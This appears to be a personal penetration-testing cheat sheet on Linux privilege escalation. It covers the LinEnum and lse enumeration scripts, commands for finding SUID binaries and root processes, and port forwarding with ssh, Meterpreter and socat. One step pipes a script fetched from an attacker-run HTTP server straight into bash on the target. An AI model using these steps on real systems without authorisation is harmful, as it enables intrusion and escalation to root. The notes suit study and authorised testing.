# Privesc

## LinEnum

```
python -m SimpleHTTPServer 8000
```

```
curl IP:8000/linenum.sh | bash
```

Add -t for a thorough check

## Linux priv checker

## linux-smart-enumeration

Unlike LinEnum, lse tries to gradualy expose the information depending on its importance from a privesc point of view.

https://github.com/diego-treitos/linux-smart-enumeration

## Useful commands

Obtain the kernel version

```
uname -a
```

Check for misconfigurations in permissions

```
sudo -l
```

Find processes running as root

```
ps -ef | grep root
```

## Finding SUID bits

```
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -ls 2>/dev/null
```

## Port Forwarding

`ss -tulpn` it will tell us what socket connections are running

To forward a port

```
ssh -L 10000:localhost:10000 <username>@<ip>
```

### Meterpreter

```
portfwd add -l 22 -p 22 -r 127.0.0.1
```
-l is our local port we want to use.
-p is the remote port we want to get access to.
-r is the remote address

### socat binary

```
/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
```

[linuxprivchecker.py -- a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Linux Privilege Escalation using SUID Binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

[ A guide to Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation)
